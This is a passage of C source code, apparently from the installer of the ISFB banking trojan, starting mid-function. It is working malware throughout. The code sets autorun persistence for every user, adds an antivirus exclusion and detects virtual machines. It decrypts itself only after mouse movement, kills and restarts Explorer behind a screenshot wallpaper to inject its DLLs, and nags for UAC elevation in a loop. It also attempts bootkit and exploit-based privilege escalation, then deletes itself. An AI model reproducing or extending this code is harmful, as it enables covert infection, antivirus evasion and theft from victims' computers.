				if (Status == NO_ERROR)
				{
					RegFilePath[(Size / sizeof(_TCHAR)) - 1] = 0;
					Status = lstrcmpi(RegFilePath, pRunCommand);
					DbgPrint("ISFB: Reg file path is \"%s\"\n", RegFilePath);
				}
				hFree(RegFilePath);
			}	// if (RegFilePath = hAlloc(Size))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;

			RegCloseKey(hKey);
		}	// if (Status == NO_ERROR)
		else
		{
			DbgPrint("ISFB: Failed to open Windows autorun key, error %u\n", Status);
		}

		if (Status != NO_ERROR)
		{
#ifndef _DLL_INSTALLER
			if (Flags & INJECT_ARCH_X64)
				PsSupDisableWow64Redirection();
#endif
			// Application isn't installed yet, installing
			RegFilePath = SaveApp(g_CurrentModulePath, g_ClientFileName, pFileData, FileSize);
#ifndef _DLL_INSTALLER
			if (Flags & INJECT_ARCH_X64)
				PsSupEnableWow64Redirection();
#else
			if (Flags & INJECT_ARCH_X64)
			{
				// We need a real file path to our DLL
				LPTSTR pRealPath;

				if (pRealPath = PsSupGetRealFilePath(RegFilePath))
				{
					hFree(RegFilePath);
					RegFilePath = pRealPath;
				}
			}	// if (Flags & INJECT_ARCH_X64)
#endif
			if (RegFilePath)
			{
#ifdef _MSSE_EXCLUSION
				AvAddMsseExclusion(RegFilePath, TRUE);
#endif
#ifdef _DLL_INSTALLER
				hFree(pRunCommand);
				pRunCommand = MakeRundllCommandLine(RegFilePath, szDllEntryPoint);
#else
				pRunCommand = RegFilePath;
#endif
				// Installing for all active users
				Status = RegEnumUsersSetAutorun(g_StartupValueName, pRunCommand, KeyFlags);

				if (Status == NO_ERROR)
				{
					HKEY hMainKey;

					if (RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hMainKey) == NO_ERROR)
					{
						Size = (lstrlen(pRunCommand) + 1) * sizeof(_TCHAR);
						XorEncryptBuffer(pRunCommand, Size, g_MachineRandSeed, FALSE);
						RegSetValueEx(hMainKey, szDataRegExeValue, 0, REG_BINARY, pRunCommand, Size);
						RegCloseKey(hMainKey);
					}	// if (RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hMainKey) == NO_ERROR)
				}
				else
				{
					DbgPrint("ISFB: Failed registering App within Windows autorun, error %u\n", Status); 
				}
			}	// if (RegFilePath)
		}	// if (Status != NO_ERROR)
		else
			// Application already installed
			Ret = FALSE;
		
		if (pRunCommand != g_CurrentModulePath)
			hFree(pRunCommand);
	}	// if (pRunCommand)

	return(Ret);
}

#endif	// _REGISTER_EXE


#ifdef _EXE_LOADER

static	VOID WaitForExplorer(VOID)
{
	HANDLE hEvent;
	while ((hEvent = OpenEvent(SYNCHRONIZE, FALSE, szExplorerEvent)) == 0)
		Sleep(100);

	WaitForSingleObject(hEvent, INFINITE);
	CloseHandle(hEvent);
}


//
//	Loads and unpacks the specified data resource.
//
static BOOL LoadUnpackResource(
	LPTSTR	ResourceName,	// name of the resource to load
	PCHAR*	pData,			// receives pointer to the resource data
	PULONG	pSize			// receives size of the resource data in bytes
	)
{
	HRSRC	hResource;
	HGLOBAL	hRes;
	BOOL	Ret = FALSE;

	// Looking for the specified client resource
	if (hResource = FindResource(NULL, ResourceName, RT_RCDATA))
	{
		// Loading the resource
		if (hRes = LoadResource(NULL, hResource))
		{
			// Unpacking the resource data
			PAP_FILE_HEADER pHeader = (PAP_FILE_HEADER)LockResource(hRes);
			PCHAR	Packed = (PCHAR)pHeader + pHeader->HeaderSize;
			PVOID	Unpacked = (PVOID)hAlloc(pHeader->OriginalSize);

			if (Unpacked)
			{
				if (aP_depack(Packed, Unpacked) == pHeader->OriginalSize)
				{
					*pData = Unpacked;
					*pSize = pHeader->OriginalSize;
					Ret = TRUE;
				}
				else
					hFree(Unpacked);
			}	// if (Unpacked)
		}	// if (hRes = LoadResource(NULL, hResource))
	}	// if (hResource = FindResource(NULL, ClientName, RT_RCDATA))

	return(Ret);
}


//
//	Loads client DLLs attached to the current program image and initializes the specified AD_CONTEXT structure
//		with their pointers and sizes.
//
static BOOL InitAdContext(
	PAD_CONTEXT	pAdContext, 
	ULONG		Flags
	)
{
	BOOL Ret = FALSE;

#ifdef _USE_BUILDER
	if (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, (PCHAR*)&pAdContext->pModule32, (PULONG)&pAdContext->Module32Size, 0, (g_CsCookie ^ CRC_CLIENT32), 0))
#else	
	if (LoadUnpackResource(_T("C132"), (PCHAR*)&pAdContext->pModule32, (PULONG)&pAdContext->Module32Size))
#endif
	{
		if (!(Flags & INJECT_ARCH_X64) || 
#ifdef _USE_BUILDER
			GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, (PCHAR*)&pAdContext->pModule64, (PULONG)&pAdContext->Module64Size, INJECT_ARCH_X64, (g_CsCookie ^ CRC_CLIENT64), 0))
#else
			LoadUnpackResource(_T("C164"), (PCHAR*)&pAdContext->pModule64, (PULONG)&pAdContext->Module64Size))
#endif
		{
			Ret = TRUE;
		}	// if (!(Flags & INJECT_ARCH_X64) || LoadUnpackResource(_T("C164")...
		else
			hFree((PVOID)pAdContext->pModule32);
	}	// if (LoadUnpackResource(_T("CLIENT32"), (PCHAR*)&AdContext.pModule32, (PULONG)&AdContext.Module32Size))

	return(Ret);
}

#ifdef _SAVE_DESKTOP

//
//	Generates a screenshot of the desktop into a temporary file.
//	Sets the screenshot as current wallpaper.
//
static WINERROR SaveDesktop(
	LPWSTR*	ppScrShot,	// receives full path to the screenshot
	LPWSTR*	ppWallpaper	// receives full path to the current wallpaper file
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	LPTSTR	pScrShotA;
	LPWSTR	pScrShotW;
	ULONG	Len = 0;

	// Creating a temp file for our screenshot
	if (pScrShotA = FilesGetTempFile(333))
	{
#if _UNICODE
		pScrShotW = pScrShotA;
#else
		Len = lstrlenA(pScrShotA);
		if (pScrShotW = hAlloc((Len + 1) * sizeof(WCHAR)))
		{
			mbstowcs(pScrShotW, pScrShotA, Len + 1);
#endif
			// Saving original wallpaper path, generating a screenshot and setting it as current wallpaper
			if ((Status = SetScrShotAsWallpaperW(pScrShotW, ppWallpaper)) == NO_ERROR)
				*ppScrShot = pScrShotW;
			else
				hFree(pScrShotW);
#ifndef	_UNICODE
			hFree(pScrShotA);
		}
#endif
	}	//	if (pScrShotA = FilesGetTempFile(333))
		
	return(Status);
}

#endif // _SAVE_DESKTOP


//
//	Restarts the Explorer process and injects client DLL into it.
//
static VOID ExecuteInject(
	ULONG	Flags
	)
{
	ULONG	ShellPid;
	HANDLE	hProcess;
	LPTSTR	pWinDir, pShellPath;
	ULONG	Size;
	BOOL	bRet;
	AD_CONTEXT	AdContext = {0};
	WINERROR Status;
#ifdef _SAVE_DESKTOP
	LPWSTR	pScrShot, pWallpaper;
#endif

	// Loading our client DLL images and initilizing AD_CONTEXT
	if (InitAdContext(&AdContext, Flags))
	{
		// Initilizing ActiveDLL engine
		if (AcStartup(&AdContext, FALSE, NULL, NULL) == NO_ERROR)
		{
			PROCESS_INFORMATION Pi = {0};
			STARTUPINFO Si = {0};

			// Inject into the Windows shell process first.
			WaitForExplorer();
			// Looking for the Explorer process ID
			GetWindowThreadProcessId(GetShellWindow(), &ShellPid);

			if ((Status = ProcessInjectDllWithThread(ShellPid)) != NO_ERROR)
			{
	#ifdef _SAVE_DESKTOP
				// Saving our desktop wallpaper (to make restarting the Explorer invisible)
				Status = SaveDesktop(&pScrShot, &pWallpaper);
	#endif

				// Obtaining the Explorer handle
				if (hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ShellPid))
				{
					// Terminating the Explorer
					// ERROR_INVALID_FUNCTION as the exit code doesn't allow it to restart ;)
					TerminateProcess(hProcess, ERROR_INVALID_FUNCTION);
					CloseHandle(hProcess);
				}

				if (Size = PsSupGetWindowsDirectory(&pWinDir))
				{
					if (pShellPath = AppAlloc((Size + cstrlen(szExplorerExe) + 1) * sizeof(_TCHAR)))
					{
						PathCombine(pShellPath, pWinDir, szExplorerExe);
	
						// Starting new Explorer 
						Si.cb = sizeof(STARTUPINFO);

						DbgPrint("ISFB: Restarting the Explorer from \"%s\"\n", pShellPath);
					
						PsSupDisableWow64Redirection();
						bRet = CreateProcess(NULL, pShellPath, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, 
							NULL, NULL, &Si, &Pi);
						PsSupEnableWow64Redirection();
						
						if (bRet)
						{
							// Injecting our client DLL into the new Explorer
							ProcessInjectDll(&Pi, 0, 0, _INJECT_AS_IMAGE);
							CloseHandle(Pi.hThread);
							CloseHandle(Pi.hProcess);
						}
						else
						{
							DbgPrint("ISFB: Unable to restart the Explorer, error %u\n", GetLastError());
						}

						hFree(pShellPath);
					}	// if (pShellPath = AppAlloc((Size + cstrlen(szExplorerExe) + 1) * sizeof(_TCHAR)))
					hFree(pWinDir);
				}	// if (Size = PsSupGetWindowsDirectory(&pWinDir))
	#ifdef	_SAVE_DESKTOP	
				if (Status == NO_ERROR)
				{
					// Waiting for the Explorer to start
					WaitForExplorer();
					// Restoring original wallpaper
					SetWallpaperW(pWallpaper);
					DeleteFileW(pScrShot);
				}
	#endif
			}	// if ((Status = ProcessInjectDllWithThread(ShellPid)) != NO_ERROR)

			EnumProcessAndInjectDll(NULL, 0);

		}	// if (AcStartup(&AdContext, FALSE, NULL, NULL) == NO_ERROR)

		if (Flags & INJECT_ARCH_X64)
			hFree((PVOID)AdContext.pModule64);
		hFree((PVOID)AdContext.pModule32);
	}	// if (InitAdContext(&AdContext, Flags))
}

#endif	// _EXE_LOADER


#ifdef _UPDATE_GROUP_ID

//
// Resets software group ID if any
//
static VOID ResetGroupId(VOID)
{
	HKEY hKey;
	CRM_CLIENT_ID	ClientId;
	ULONG DataType, Size;

	if (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR)
	{
		if (RegQueryValueEx(hKey, szDataRegClientId, NULL, &DataType, (PCHAR)&ClientId, &Size) == NO_ERROR && Size == sizeof(CRM_CLIENT_ID))
		{
			ClientId.GroupId = 0;
			RegSetValueEx(hKey, szDataRegClientId, 0, REG_BINARY, (PCHAR)&ClientId, sizeof(CRM_CLIENT_ID));
		}
		RegCloseKey(hKey);
	}	// if (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR)
}
#endif	// _UPDATE_GROUP_ID


#if (defined(_REQUEST_UAC) || defined(_ELEVATE_UAC))
//
//	Checks current process toket if there's an elevation required.
//	Request UAC elevation if needed.
//	
BOOL IsElevated(
	PULONG	pIntegrityLevel
	)
{
	UCHAR VersionHi = LOBYTE(LOWORD(g_SystemVersion));
	BOOL bElevated = TRUE;
	PTOKEN_MANDATORY_LABEL pTML;
	ULONG IntegrityLevel = SECURITY_MANDATORY_MEDIUM_RID;

	// Check if there's our module path resolved and OS version is higher then 5
	if (VersionHi > 5)
	{
		// For Vista and higher:
		// Checking for UAC elevated token
		HANDLE	hToken;
		ULONG	bSize;

		bElevated = FALSE;
		if (OpenProcessToken(GetCurrentProcess(), READ_CONTROL | TOKEN_QUERY, &hToken))
		{
			GetTokenInformation(hToken, TokenElevation, &bElevated, sizeof(BOOL), &bSize);

			bSize = 0;
			GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &bSize);
			if (bSize && (pTML = AppAlloc(bSize)))
			{
				if (GetTokenInformation(hToken, TokenIntegrityLevel, pTML, bSize, &bSize))
					IntegrityLevel = *GetSidSubAuthority(pTML->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTML->Label.Sid) - 1));
				AppFree(pTML);
			}
			CloseHandle(hToken);
		}	// if (OpenProcessToken(GetCurrentProcess(), READ_CONTROL | TOKEN_QUERY, &hToken))
	}	// if (VersionHi > 5)

	*pIntegrityLevel = IntegrityLevel;

	return(bElevated);
}

#endif	// (defined(_REQUEST_UAC) || defined(_ELEVATE_UAC))


#ifdef _REQUEST_UAC

//
//	Restarts current process or reloads current DLL with UAC elevation request message.
//	
static VOID	RequestUac(VOID)
{
	SHELLEXECUTEINFO	ExecInfo = {0};

	ASSERT(g_CurrentModulePath);

	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	
#ifdef _DLL_INSTALLER
	{
		// Reloading current DLL
		LPTSTR pParameters;

		// Allocating parameters for the rundll32 call
		if (pParameters = AppAlloc((cstrlen(szRunFmt2) + lstrlen(g_CurrentModulePath) + cstrlen(szDllEntryPoint) + 1) * sizeof(_TCHAR)))
		{
			wsprintf(pParameters, szRunFmt2, g_CurrentModulePath, szDllEntryPoint);

			ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			ExecInfo.lpVerb = szRunas;
			ExecInfo.lpFile = szRundll32;
			ExecInfo.lpParameters = pParameters;

			while(!ShellExecuteEx(&ExecInfo));

			AppFree(pParameters);
		}	// if (pParameters = AppAlloc(...
	}
#else
	{
		LPTSTR pExt, pNewPath, pStartCmd = NULL;
		
		if (pNewPath = FilesGetTempFile(9071))
		{
			if (pExt = PathFindExtension(pNewPath))
				lstrcpy(pExt, szExtExe);

			if (pStartCmd = AppAlloc((cstrlen(szCmdCopyRun) + lstrlen(pNewPath) * 2 + lstrlen(g_CurrentModulePath) + 1) * sizeof(_TCHAR)))
				wsprintf(pStartCmd, szCmdCopyRun, g_CurrentModulePath, pNewPath, pNewPath);

			AppFree(pNewPath);
		}	// if (pNewPath = FilesGetTempFile(9071))
		
		// Restarting current process
		ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ExecInfo.lpVerb = szRunas;
		ExecInfo.lpFile = (pStartCmd ? szCmdExe : g_CurrentModulePath);
		ExecInfo.lpParameters = pStartCmd;

		while(!ShellExecuteEx(&ExecInfo));

		if (pStartCmd)
			AppFree(pStartCmd);
	}
#endif

	DbgPrint("ISFB: Shell Execute complete, status %u\n", GetLastError());

	CoUninitialize();
}

#endif // _REQUEST_UAC

//
//	Application setup function
//
WINERROR CrmSetup(
	LPTSTR	pCmdLine	// Application command line string
	)
{
	BOOL	bSelfDelete = TRUE, bInstalled = FALSE;
	HANDLE	hEvent, hTimer;
	ULONG	Flags = 0;
	WINERROR Status;
	SECURITY_ATTRIBUTES Sa;

#ifdef _WAIT_USER_INPUT
	do
	{
		ULONG Seed = AvGetCursorMovement();

		Sleep(100);

		if (!Seed)
		{
			Status = ERROR_BADKEY;
			continue;
		}

		Status = CsDecryptSection(g_CurrentModule, Seed % 9);
	} while(Status == ERROR_BADKEY);
#else
	Status = CsDecryptSection(g_CurrentModule, 0);
#endif

	if (Status == NO_ERROR)
	{
		do 
		{
			NT_SID Sid = {0};
			LONG	i;

			InitGlobals(g_CurrentModule, G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_CURRENT_MODULE_PATH);
			// We do not check the result of InitGlobals() here coz it can fail only in case we are unable to resolve 
			//	current module path. But it doesn't mean we sholdn't inject our DLL's either.

			if (g_CurrentModulePath)
			{
				DbgPrint("ISFB: Started from \"%s\"\n", g_CurrentModulePath);
			}

			if (PsSupIsWow64Process(g_CurrentProcessId, 0))
			{
				g_CurrentProcessFlags = GF_WOW64_PROCESS;
				Flags = INJECT_ARCH_X64;
			}

#ifndef _DLL_INSTALLER
			// Obsolete. Used to update an old, process-based software, currently unsupported.
//			CheckProcessParameters(pCmdLine);
#endif
#ifdef _CHECK_VM
			if (g_bCheckVm && AvIsVm())
			{
				DbgPrint("ISFB: Started on a VM, skipping install\n");
				Status = ERROR_NOT_SUPPORTED;
				break;
			}
#endif
#if (defined(_USE_BUILDER) && defined(_INSTALL_BK))
			// Trying to perform privileges elevation
			Status = BkLoadSupportDll(g_CsCookie ^ CRC_UACDLL);
			if (Status != ERROR_INVALID_FUNCTION)
				Status = BkLoadSupportDll(g_CsCookie ^ CRC_CVEDLL);

			if (Status == ERROR_INVALID_FUNCTION)
			{
				// Elevation successed
				bSelfDelete = FALSE;
				break;
			}

			// Trying to install BK first
			if ((Status = BkSetup(FALSE)) == NO_ERROR)
			{
				DbgPrint("ISFB: BkSetup completed successfully.\n");
				if (g_CurrentModulePath)
				{
					if (MoveFileEx(g_CurrentModulePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
						bSelfDelete = FALSE;
				}
				BkReboot();
				break;
			}
#endif
			Status = ERROR_UNSUCCESSFULL;
			
			// Obtaining current user SID and initializing rand seed with the hash of the machine ID taken from the SID
			if (!(LsaGetProcessUserSID(g_CurrentProcessId, &Sid)))
			{
				DbgPrint("ISFB: Failed to resolve current user SID.\n");
				break;
			}

			if (Sid.SubcreatedityCount > 2)
			{
				for (i=0; i<(Sid.SubcreatedityCount-2); i++)
					g_MachineRandSeed += Sid.Subcreatedity[i+1];
			}

			// Randomizing installer-specific GUID values
			g_MachineRandSeed ^= uInstallerSeed;
			
			if (!GenMachineLevelNames())
			{
				DbgPrint("ISFB: Failed generating machine-level names.\n");
				break;
			}

#if (defined(_REQUEST_UAC) || defined(_ELEVATE_UAC))
 #ifdef _REGISTER_EXE
			// Check if we are not registered within autorun and we have our module path resolved
			if (!(bInstalled = IsInstalled(Flags)) && g_CurrentModulePath)
 #endif
			{
				ULONG IntegrityLevel;

				if (!IsElevated(&IntegrityLevel) && (IntegrityLevel == SECURITY_MANDATORY_LOW_RID))
				{
					bSelfDelete = FALSE;
#ifdef _REQUEST_UAC
					RequestUac();
					Status = ERROR_ACCESS_DENIED;
					break;
#endif
				}	// if (!IsElevated(&IntegrityLevel) && IntegrityLevel == SECURITY_MANDATORY_LOW_RID)
			}	// if (!(bInstalled = IsInstalled(Flags)))
#endif	// _REQUEST_UAC

			// Stopping all DLLs injected
			if (LOBYTE(LOWORD(g_SystemVersion)) > 5)
				LsaInitializeLowSecurityAttributes(&Sa);
			else
				LsaInitializeDefaultSecurityAttributes(&Sa);

			// Opening DLL update event
			if (!(hEvent = CreateEvent(&Sa, TRUE, FALSE, g_UpdateEventName)))
				break;

			if (GetLastError() == ERROR_ALREADY_EXISTS)
			{
				// Setting DLL update event to stop all DLLs.
				SetEvent(hEvent);
				DbgPrint("ISFB: Client update event fired, waiting for clients to unload\n");
		
				// Sleep to allow all DLLs to unload
				Sleep(WAIT_TO_UNLOAD_TIMEOUT);

				ResetEvent(hEvent);
			}	// if (GetLastError() == ERROR_ALREADY_EXISTS)

			CloseHandle(hEvent);

	#ifdef _UPDATE_GROUP_ID
			// Reseting software group ID within the registry
			ResetGroupId();
	#endif

#ifdef _EXE_LOADER
	 #ifdef _REGISTER_EXE
			if (!bInstalled)
				bSelfDelete = InstallApp(Flags);
			else
				bSelfDelete = FALSE;
	 #endif
			ExecuteInject(Flags);
#else	// _EXE_LOADER

			// Try to install and inject the 32-bit DLL into processes.
	 #ifdef _USE_BUILDER
			InstallClientFj(g_CsCookie ^ CRC_CLIENT32, 0);
	 #else
			InstallClientRsrc(_T("C132"), 0);
	 #endif
			// Check if we are running on 64-bit machine
			if (Flags & INJECT_ARCH_X64)
			{
				// Try to install and inject the 64-bit DLL into processes.
	 #ifdef _USE_BUILDER
				InstallClientFj(g_CsCookie ^ CRC_CLIENT64, INJECT_ARCH_X64);
	 #else
				InstallClientRsrc( _T("C164"), INJECT_ARCH_X64);
	 #endif
			}
#endif	// else //_EXE_LOADER

			// Setting config update timer to 1 second to let all newly loaded DLLs to update a config.
			if (hTimer = CreateWaitableTimer(&Sa, TRUE, g_ConfigUpdateTimerName))
			{
				LARGE_INTEGER DueTime;
				DueTime.QuadPart = _RELATIVE(_SECONDS(1));
				SetWaitableTimer(hTimer, &DueTime, 0, NULL, NULL, FALSE);
				CloseHandle(hTimer);
			}

			LsaFreeSecurityAttributes(&Sa);

			Status = NO_ERROR;
		} while(FALSE);

		if (Status == ERROR_UNSUCCESSFULL)
			Status = GetLastError();

#if (!defined(_EXE_LOADER) || defined(_REGISTER_EXE))
		// Do not try to perform self delete if we don't register EXE coz in this case EXE is being started by a third-party loader
		if (bSelfDelete)
			// Initializing self-delete .bat
			DoSelfDelete();
#endif
	}	// if ((Status = CsDecryptSection(CurrentModule, 0)) == NO_ERROR)

	return(Status);
}
